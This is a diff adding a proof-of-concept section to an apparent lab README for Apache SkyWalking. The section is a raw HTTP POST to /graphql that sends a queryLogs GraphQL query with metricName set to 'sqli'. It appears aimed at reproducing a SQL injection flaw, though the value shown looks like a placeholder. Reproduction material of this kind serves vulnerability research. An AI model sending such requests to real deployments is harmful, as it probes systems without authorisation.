@@ -28,7 +28,45 @@ cd apache-skywalking-apm-bin/bin
 ./startup.sh
 ```
 After the environment is started, visit http://your-ip:8080 to view the Skywalking page.
+# POC
+The HTTP request of this GraphQL query is
+```bash
+POST /graphql HTTP/1.1
+Host: 192.168.1.12:8080
+Content-Length: 405
+Accept: application/json, text/plain, */*
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.88 Safari/537.36
+Content-Type: application/json;charset=UTF-8
+Origin: http://192.168.1.12:8080
+Referer: http://192.168.1.12:8080/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Connection: close
 
+{
+    "query":"query queryLogs($condition: LogQueryCondition) {
+  queryLogs(condition: $condition) {
+    total
+    logs {
+      serviceId
+      serviceName
+      isError
+      content
+    }
+  }
+}
+",
+    "variables":{
+        "condition":{
+            "metricName":"sqli",
+            "state":"ALL",
+            "paging":{
+                "pageSize":10
+            }
+        }
+    }
+}
+```
 
 
 
